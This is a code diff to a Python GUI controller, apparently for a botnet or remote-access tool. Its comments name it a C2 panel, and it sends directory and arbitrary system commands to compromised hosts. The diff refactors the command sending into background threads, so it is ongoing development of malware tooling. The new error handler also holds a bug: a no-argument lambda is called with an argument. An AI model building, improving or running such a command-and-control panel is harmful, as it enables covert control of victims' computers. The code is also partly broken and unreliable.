@@ -2220,54 +2220,42 @@ def rouji_panel():
 
         # command_line.insert(END, result + "\n")
 
-    def change_directory(rouji_ID,command):
-        # 记录命令
-        change_dir = command[3:].strip()
-        # 发送命令
-        client.send(f"{rouji_ID} #> {command}".encode("UTF-8"))
-        # 发送命令后，准备接收工作
-        # data = client.recv(4096)
-        # encoding = chardet.detect(data)['encoding']     # chardet来进行编码设置
-        # result = data.decode(encoding)
-        result = recv_result(client)
+    # P1-2a: 后台发送 C2 命令并接收结果，避免阻塞 UI 主线程；
+    # 结果 / 错误通过 command_line.after(0, ...) 回主线程写回。
+    # c2_cmd_lock 串行化对同一 client socket 的 C2 命令帧收发，避免多命令并发导致协议失步
+    c2_cmd_lock = threading.Lock()
 
-        command_line.insert(END, result + "\n")
+    def _run_c2_command(rouji_ID, command, on_result=None, on_error=None):
+        def _worker():
+            with c2_cmd_lock:
+                try:
+                    client.send(f"{rouji_ID} #> {command}".encode("UTF-8"))
+                    result = recv_result(client)
+                except Exception as e:
+                    if on_error:
+                        command_line.after(0, lambda e=e: on_error(e))
+                    else:
+                        command_line.after(0, lambda e=e: command_line.insert(END, f"Error: {e}\n"))
+                    return
+            # 写回 UI（主线程）
+            if on_result:
+                command_line.after(0, lambda r=result: on_result(r))
+            else:
+                command_line.after(0, lambda r=result: command_line.insert(END, r + "\n"))
+        threading.Thread(target=_worker, daemon=True).start()
+
+    def change_directory(rouji_ID,command):
+        _run_c2_command(rouji_ID, command)
 
     def list_directory(rouji_ID,command):
-        try:
-            # 发送指令 ls
-            client.send(f"{rouji_ID} #> {command}".encode("UTF-8"))
-            # 发送命令后，准备接收工作
-            # data = client.recv(4096)
-            # encoding = chardet.detect(data)['encoding']     # chardet来进行编码设置
-            # files = data.decode(encoding)
-            files = recv_result(client)
-            # ----------------------------------
-            # files = os.listdir()
+        def _append_files(files):
             for file in files:
                 command_line.insert(END, f"{file}\n")
-        except PermissionError:
-            command_line.insert(END, "No permission to list directory contents\n")
+        _run_c2_command(rouji_ID, command, on_result=_append_files,
+                        on_error=lambda: command_line.insert(END, "No permission to list directory contents\n"))
 
     def run_system_command(rouji_ID,command):
-        try:
-            # 执行系统命令
-            # result = subprocess.run(command, shell=True, text=True, capture_output=True)
-            client.send(f"{rouji_ID} #> {command}".encode("UTF-8"))
-            # 发送命令后，准备接收工作
-            # data = client.recv(4096)
-            result = recv_result(client)
-
-            # encoding = chardet.detect(data)['encoding']     # chardet来进行编码设置
-            # result = data.decode(encoding)
-            # 处理命令执行结果
-            # print(result)
-            # command_line.insert(END, result.stdout)
-            command_line.insert(END, result + "\n")
-            # if result.stderr:
-            #     command_line.insert(END, result.stderr)
-        except Exception as e:
-            command_line.insert(END, f"Error: {e}\n")
+        _run_c2_command(rouji_ID, command)
     def clear_screen():
         # 清除文本框中的所有内容
         command_line.delete("1.0", END)
